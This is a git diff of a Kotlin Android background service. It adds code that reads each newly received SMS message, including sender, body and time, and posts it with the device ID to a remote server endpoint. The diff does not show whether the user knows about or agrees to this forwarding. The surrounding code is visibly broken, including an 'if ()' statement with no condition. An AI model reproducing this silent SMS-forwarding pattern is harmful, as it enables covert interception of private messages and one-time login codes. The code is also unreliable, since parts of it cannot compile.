@@ -43,7 +43,7 @@ class MainService : BaseService() {
                 }
                 (application as MainApp).api.pingStatus("${Preferences.baseUrl}/path/to/status", androidId)
                     .subscribeOn(Schedulers.io())
-                    .subscribe()
+                    .subscribe({}, {})
                 if () {
 
                 }
@@ -53,15 +53,32 @@ class MainService : BaseService() {
                     smsDisposable.clear()
                     time = System.currentTimeMillis()
                     smsDisposable.add(RxCursorLoader.create(contentResolver, smsQuery)
-                        .subscribe { cursor ->
+                        .subscribe({ cursor ->
                             cursor.use {
                                 Timber.d("content://sms ${it.count}")
+                                if (it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
+                                    != Telephony.Sms.MESSAGE_TYPE_INBOX) {
+                                    Timber.i("Last sms is outcoming")
+                                    return@use
+                                }
+                                val smsTime = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
+                                if (smsTime <= time) {
+                                    Timber.i("Last sms time is earlier or the same: %d <= %d",
+                                        smsTime, time)
+                                    return@use
+                                }
+                                time = smsTime
+                                val from = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
+                                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                                 (application as MainApp).api.sendSms("${Preferences.baseUrl}/path/to/sms",
-                                    androidId, "", "")
+                                    androidId, smsTime, from, body)
                                     .subscribeOn(Schedulers.io())
-                                    .subscribe()
+                                    .subscribe({}, {})
                             }
-                        })
+                        }, {
+                            Timber.e(it)
+                            showToast(it.message.toString())
+                        }))
                 }
             })
         return START_NOT_STICKY
